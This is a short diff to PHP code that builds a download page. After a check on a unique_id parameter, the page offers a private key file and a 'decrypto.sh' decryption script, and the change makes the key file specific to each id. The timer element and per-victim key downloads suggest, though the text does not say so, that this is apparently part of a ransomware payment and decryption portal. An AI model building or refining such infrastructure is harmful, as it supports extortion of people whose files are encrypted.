@@ -37,7 +37,7 @@ if (isset($_GET['unique_id']) && !empty($_GET['unique_id'])) {
             echo "   $(document).ready(function() {" . "\n";
             echo "      $('#title').hide();" . "\n";
             echo "      $('#new_title').append(\"<center><font color=\'green\'><h3>Download Links</h3></font></center>\");" . "\n";
-            echo "      $('#show_timer').append(\"<center><a href=\'https://" .  $_SERVER['SERVER_NAME'] . "/downloads/priv.pem\'>Private Key Download</a></center><br /><br /><center><a href=\'https://" .  $_SERVER['SERVER_NAME'] . "/downloads/decrypto.sh\'>Decryption Software Download</a></center>\");" . "\n";
+            echo "      $('#show_timer').append(\"<center><a href=\'https://" .  $_SERVER['SERVER_NAME'] . "/downloads/" . $uniqueID . "_priv.pem\'>Private Key Download</a></center><br /><br /><center><a href=\'https://" .  $_SERVER['SERVER_NAME'] . "/downloads/decrypto.sh\'>Decryption Software Download</a></center>\");" . "\n";
             echo "   });" . "\n";
             echo "</script>" . "\n";
          } else {
